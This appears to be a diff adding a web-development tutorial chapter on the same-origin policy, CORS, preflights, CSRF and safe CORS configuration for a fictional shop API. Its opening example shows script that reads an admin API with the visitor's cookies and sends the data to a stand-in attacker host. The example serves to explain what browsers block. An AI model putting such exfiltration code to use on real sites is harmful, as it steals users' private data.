@@ -1,0 +1,281 @@
+import { CorsSim, OriginCmp, SeqDiagram } from "@/components/learn/widgets/lazy";
+
+## Why browsers need a rule
+
+Your browser is logged in to many sites at once: Kadé's admin panel, your bank, your email. Each has cookies the browser sends automatically (<Ch n="24">chapter 24</Ch>). Now you open some random page, and its JavaScript runs:
+
+```code
+const r = await fetch('https://admin.kade.lk/api/customers', { credentials: 'include' });
+const data = await r.json();          // your admin cookie was attached…
+sendTo('https://evil.example', data); // …and now every customer's details are stolen
+```
+
+If this worked, any website could read anything any other site shows you. The <Term>same-origin policy</Term> (SOP) is the browser rule that stops it: **a page may freely read responses only from its own origin**.
+
+## What an origin is
+
+An <Term>origin</Term> is three things together: **scheme + host + port**. All three must match exactly. The path does not matter.
+
+<Table>
+  <thead>
+    <tr><th>#</th><th>Compared with https://kade.lk</th><th>Same origin?</th><th>Why</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>1</td><td>`https://kade.lk/orders/1042`</td><td>yes</td><td>Only the path differs</td></tr>
+    <tr><td>2</td><td>`https://api.kade.lk`</td><td>no</td><td>Different host</td></tr>
+    <tr><td>3</td><td>`https://www.kade.lk`</td><td>no</td><td>Different host (www counts)</td></tr>
+    <tr><td>4</td><td>`http://kade.lk`</td><td>no</td><td>Different scheme</td></tr>
+    <tr><td>5</td><td>`https://kade.lk:8443`</td><td>no</td><td>Different port (https means 443)</td></tr>
+    <tr><td>6</td><td>`http://localhost:3000`</td><td>no</td><td>Everything differs: this is your local frontend in development</td></tr>
+  </tbody>
+</Table>
+
+Check any pair yourself:
+
+<OriginCmp />
+
+<Note>
+
+**Origin vs site.** A **site** is looser: the registrable domain (kade.lk) plus the scheme. kade.lk, api.kade.lk and admin.kade.lk are **cross-origin but same-site**. The same-origin policy uses origins; cookies' `SameSite` flag (<Ch n="24">chapter 24</Ch>) uses sites. This difference matters in section 8.
+
+</Note>
+
+## What the policy blocks, and what it allows
+
+The same-origin policy is narrower than most people think. It mainly stops **reading**, not **sending**:
+
+<Table>
+  <thead>
+    <tr><th>#</th><th>A page on kade.lk tries to …</th><th>Allowed?</th><th>Notes</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>1</td><td>Read the response of `fetch()` to api.kade.lk</td><td>blocked, unless CORS allows it</td><td>This chapter's main topic</td></tr>
+    <tr><td>2</td><td>**Send** a `fetch()` or form POST to api.kade.lk</td><td>the request is sent</td><td>The browser may just refuse to show the answer. See section 4.</td></tr>
+    <tr><td>3</td><td>Show `<img>`, load `<script>`, CSS, fonts, video from another origin</td><td>yes</td><td>It can use them, but cannot read their raw bytes</td></tr>
+    <tr><td>4</td><td>Read the page inside an `<iframe>` from another origin</td><td>blocked</td><td>It can show it, not look inside it</td></tr>
+    <tr><td>5</td><td>Read another origin's localStorage or cookies from JavaScript</td><td>blocked</td><td>Storage is kept per origin</td></tr>
+  </tbody>
+</Table>
+
+## "Sending is allowed": CSRF
+
+Row 2 surprises people. A malicious page cannot _read_ Kadé's responses, but it can make your browser _send_ requests to Kadé, with your cookies attached. If kade-api changed something on such a request (`POST /account/email`), the damage is done even though the attacker never sees the reply. This is <Term>CSRF</Term> (cross-site request forgery).
+
+<Key title="CORS does not stop CSRF">
+
+CORS is about reading responses. To stop forged requests, use **SameSite** cookies (Lax or Strict, <Ch n="24">chapter 24</Ch>), check the `Origin` header on state-changing requests, or use CSRF tokens. Token-based APIs (Authorization header, not cookies) are not exposed in the same way, because the browser never adds that header by itself.
+
+</Key>
+
+## CORS: the server opts in
+
+<Term>CORS</Term> (Cross-Origin Resource Sharing) is how a server tells the browser "pages from these other origins may read my responses". The browser sends an `Origin` header saying where the page came from; the server answers with `Access-Control-Allow-Origin`:
+
+<SeqDiagram set="corssimple" />
+
+- **The server only declares; the browser enforces.** kade-api sends its answer either way. If the headers do not allow the page's origin, the browser hides the response from JavaScript and shows a CORS error in the console.
+- **That is why curl and Postman never have CORS problems.** They are not browsers and do not enforce the policy. "It works in Postman but not in the browser" is the classic CORS symptom.
+
+## Simple requests and preflights
+
+For some requests the browser first asks permission with a <Term>preflight</Term>: an `OPTIONS` request describing what it wants to send. Only if the answer allows it does the real request go out. Requests that could already be made by an old-fashioned HTML form skip the preflight; these are called **simple requests**:
+
+<Table>
+  <thead>
+    <tr><th>A request is "simple" only if</th><th>Details</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Method is</td><td><Mono>GET, HEAD or POST</Mono></td></tr>
+    <tr><td>Headers are only</td><td>a small safe list (Accept, Accept-Language, Content-Language, Content-Type, and a few others). **Authorization and any custom header (X-Request-Id …) are not on it.**</td></tr>
+    <tr><td>Content-Type is one of</td><td><Mono>text/plain · multipart/form-data · application/x-www-form-urlencoded <Sub>application/json is **not** on the list</Sub></Mono></td></tr>
+  </tbody>
+</Table>
+
+<Caption>So almost every real API call from kade.lk (JSON body, Bearer token) is preflighted.</Caption>
+
+<SeqDiagram set="corspre" />
+
+<Table>
+  <thead>
+    <tr><th>Header</th><th>Meaning</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><Mono>Access-Control-Request-Method: PATCH</Mono></td><td>(preflight request) "the real request will be a PATCH"</td></tr>
+    <tr><td><Mono>Access-Control-Request-Headers: authorization, content-type</Mono></td><td>(preflight request) "and it will carry these headers"</td></tr>
+    <tr><td><Mono>Access-Control-Allow-Methods: GET, POST, PATCH, DELETE</Mono></td><td>(preflight response) methods allowed</td></tr>
+    <tr><td><Mono>Access-Control-Allow-Headers: authorization, content-type</Mono></td><td>(preflight response) headers allowed</td></tr>
+    <tr><td><Mono>Access-Control-Max-Age: 600</Mono></td><td>(preflight response) cache this answer for 10 minutes, so the next calls skip the preflight</td></tr>
+  </tbody>
+</Table>
+
+<Caption>Every preflight costs one extra round trip (41 ms from home, <Ch n="13">chapter 13</Ch>). Max-Age matters for performance.</Caption>
+
+## Try it: will this request work?
+
+kade-api allows `https://kade.lk` and `https://admin.kade.lk`, with credentials, the methods GET/POST/PATCH/DELETE and the headers Authorization and Content-Type. Build a request from a page and follow the browser's steps:
+
+<CorsSim />
+
+## Credentials: cookies across origins
+
+By default a cross-origin `fetch()` sends **no cookies**. To send them, the page asks with `credentials: 'include'`, and the server must agree more strictly:
+
+<Table>
+  <tbody>
+    <tr><td><Mono>Access-Control-Allow-Credentials: true</Mono></td><td>Required, or the browser hides the response</td></tr>
+    <tr><td><Mono>Access-Control-Allow-Origin: https://kade.lk</Mono></td><td>Must be the exact origin. `*` is **not allowed** with credentials.</td></tr>
+    <tr><td><Mono>The cookie's own SameSite rule</Mono></td><td>Still applies. kade.lk → api.kade.lk is **same-site**, so a `SameSite=Lax` cookie is sent. A truly cross-site caller (another domain) needs `SameSite=None; Secure`.</td></tr>
+  </tbody>
+</Table>
+
+## Reading response headers
+
+Even when CORS allows the response, JavaScript can only read a few "safe" response headers (Content-Type, Cache-Control and a handful more). If kade-api sends `X-Total-Count` for pagination, or `Location` after creating an order, it must list them:
+
+```text
+Access-Control-Expose-Headers: X-Total-Count, Location
+```
+
+## Configuring kade-api safely
+
+```code
+const ALLOWED = new Set(['https://kade.lk', 'https://admin.kade.lk']);
+if (process.env.NODE_ENV !== 'production') ALLOWED.add('http://localhost:3000');
+
+app.use(cors({
+  origin: (origin, cb) => cb(null, !origin || ALLOWED.has(origin)),  // exact matches only
+  credentials: true,
+  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
+  allowedHeaders: ['Authorization', 'Content-Type'],
+  exposedHeaders: ['X-Total-Count', 'Location'],
+  maxAge: 600,
+}));
+```
+
+<Table>
+  <thead>
+    <tr><th>#</th><th>Mistake</th><th>Why it is dangerous</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>1</td><td>Copying the request's Origin back into Allow-Origin, with credentials</td><td>Every website becomes "allowed", with your users' cookies. The same as having no policy.</td></tr>
+    <tr><td>2</td><td>Checking origins with "ends with kade.lk" or a loose regex</td><td>`https://evilkade.lk` or `https://kade.lk.evil.example` passes. Compare exact strings.</td></tr>
+    <tr><td>3</td><td>Allowing the origin `null`</td><td>Sandboxed iframes and local files send `Origin: null`, and attackers can produce it too</td></tr>
+    <tr><td>4</td><td>Allowing localhost in production</td><td>Any program on a user's machine can serve localhost</td></tr>
+    <tr><td>5</td><td>Forgetting `Vary: Origin` when the answer depends on the origin</td><td>A cache or CDN may store the response allowed for one origin and serve it to another. Most CORS libraries add it.</td></tr>
+  </tbody>
+</Table>
+
+## Debugging CORS errors
+
+The browser console only says "blocked by CORS policy". The real cause is usually one of these:
+
+<Table>
+  <thead>
+    <tr><th>#</th><th>Symptom</th><th>Real cause</th><th>Fix</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>1</td><td>Preflight fails with 401</td><td>The auth middleware runs before CORS and rejects the OPTIONS request, which never carries the token</td><td>Answer OPTIONS before authentication</td></tr>
+    <tr><td>2</td><td>Preflight fails with 404 or 405</td><td>No route handles OPTIONS</td><td>Let the CORS middleware answer it</td></tr>
+    <tr><td>3</td><td>"Redirect is not allowed for a preflight request"</td><td>http → https or a trailing-slash redirect on the API</td><td>Call the final URL directly</td></tr>
+    <tr><td>4</td><td>A 500 shows up as a CORS error</td><td>The error handler sends a response without CORS headers, so the browser hides it</td><td>Add CORS headers to error responses too; check the Network tab, not the console</td></tr>
+    <tr><td>5</td><td>"Wildcard '\*' cannot be used … credentials"</td><td>Allow-Origin: \* with credentials: include</td><td>Return the exact origin</td></tr>
+    <tr><td>6</td><td>Works locally, fails in production</td><td>A proxy, load balancer or CDN in front strips or caches the headers</td><td>Check the headers the browser actually received</td></tr>
+  </tbody>
+</Table>
+
+<Caption>In DevTools, the preflight appears as its own OPTIONS row in the Network tab. Look at its status and response headers first.</Caption>
+
+## What CORS is not, and a way to avoid it
+
+- **Not server protection.** curl, scripts and other servers ignore it entirely. Authentication and authorization still protect kade-api.
+- **Not CSRF protection** (section 4).
+- **Not for WebSockets.** Browsers do not apply CORS to them; check `Origin` in the handshake yourself (<Ch n="26">chapter 26</Ch>).
+- **Avoiding it:** if the site and the API share one origin, there is nothing to configure. A load balancer can serve both from `https://kade.lk`, sending `/api/*` to kade-api and everything else to the frontend. No CORS headers, no preflights, no extra round trips.
+
+## Related browser protections
+
+<Table>
+  <thead>
+    <tr><th>#</th><th>Mechanism</th><th>What it controls</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>1</td><td>SameSite cookies</td><td>Whether cookies go along on cross-site requests (<Ch n="24">chapter 24</Ch>, section 4 above)</td></tr>
+    <tr><td>2</td><td>CSP (Content-Security-Policy)</td><td>Which scripts, styles and servers **your own page** may load or talk to. Limits the damage of injected scripts (XSS).</td></tr>
+    <tr><td>3</td><td>X-Frame-Options / CSP frame-ancestors</td><td>Whether other sites may put your page in an iframe (stops clickjacking on the admin panel)</td></tr>
+    <tr><td>4</td><td>CORP, COOP, COEP</td><td>Newer headers that isolate a site's resources and windows from other origins</td></tr>
+  </tbody>
+</Table>
+
+## Summary
+
+<Table>
+  <thead>
+    <tr><th>#</th><th>Idea</th><th>In one line</th><th>New terms</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>1</td><td>Why</td><td>Stop one site's scripts reading another site's data using your cookies</td><td>same-origin policy</td></tr>
+    <tr><td>2</td><td>Origin</td><td>Scheme + host + port, exactly; a site is looser (kade.lk and api.kade.lk are same-site)</td><td>origin, site</td></tr>
+    <tr><td>3-4</td><td>Rules</td><td>Reading is blocked; sending is not, hence CSRF</td><td>CSRF</td></tr>
+    <tr><td>5</td><td>CORS</td><td>Origin → Access-Control-Allow-Origin; the browser enforces</td><td>CORS</td></tr>
+    <tr><td>6</td><td>Preflight</td><td>OPTIONS first for non-simple requests (JSON, Authorization); cache with Max-Age</td><td>simple request, preflight</td></tr>
+    <tr><td>8-9</td><td>Credentials, exposure</td><td>Allow-Credentials + exact origin; Expose-Headers for custom headers</td><td></td></tr>
+    <tr><td>10-11</td><td>Practice</td><td>Exact allowlist, Vary: Origin; OPTIONS before auth; CORS on error responses</td><td></td></tr>
+    <tr><td>12-13</td><td>Limits</td><td>Not auth, not CSRF defence, not WebSockets; same origin avoids it; CSP and friends</td><td>CSP</td></tr>
+  </tbody>
+</Table>
+
+## Try it yourself
+
+<TryIt n={1} title="A preflight, by hand">
+
+- **What to look for:** `204` with Allow-Origin, Allow-Methods, Allow-Headers, Max-Age.
+- **From section:** [6. Simple requests and preflights](#simple-requests-and-preflights)
+
+```sh
+curl -i -X OPTIONS https://api.kade.lk/orders -H 'Origin: https://kade.lk' -H 'Access-Control-Request-Method: POST' -H 'Access-Control-Request-Headers: authorization,content-type'
+```
+
+</TryIt>
+
+<TryIt n={2} title="What kade-api says to a stranger">
+
+- **Steps:** Same command with `-H 'Origin: https://evil.example'`
+- **What to look for:** No `Access-Control-Allow-Origin` header at all.
+- **From section:** [10. Configuring kade-api safely](#configuring-kade-api-safely)
+
+```sh
+-H 'Origin: https://evil.example'
+```
+
+</TryIt>
+
+<TryIt n={3} title="A simple request's CORS headers">
+
+- **What to look for:** `Access-Control-Allow-Origin: https://kade.lk` and `Vary: Origin`.
+- **From section:** [5. CORS: the server opts in](#cors-the-server-opts-in)
+
+```sh
+curl -i https://api.kade.lk/health -H 'Origin: https://kade.lk'
+```
+
+</TryIt>
+
+<TryIt n={4} title="The browser's view">
+
+- **Steps:** DevTools → Network → the OPTIONS row → Headers
+- **What to look for:** Status, and whether the allow headers match what the real request needs.
+- **From section:** [11. Debugging CORS errors](#debugging-cors-errors)
+
+</TryIt>
+
+<TryIt n={5} title="The policy in action">
+
+- **Steps:** DevTools console on any site: `fetch('https://example.com').then(r => r.text())`
+- **What to look for:** A CORS error, even though the Network tab shows the request succeeded.
+- **From section:** [1. Why browsers need a rule](#why-browsers-need-a-rule)
+
+```sh
+fetch('https://example.com').then(r => r.text())
+```
+
+</TryIt>
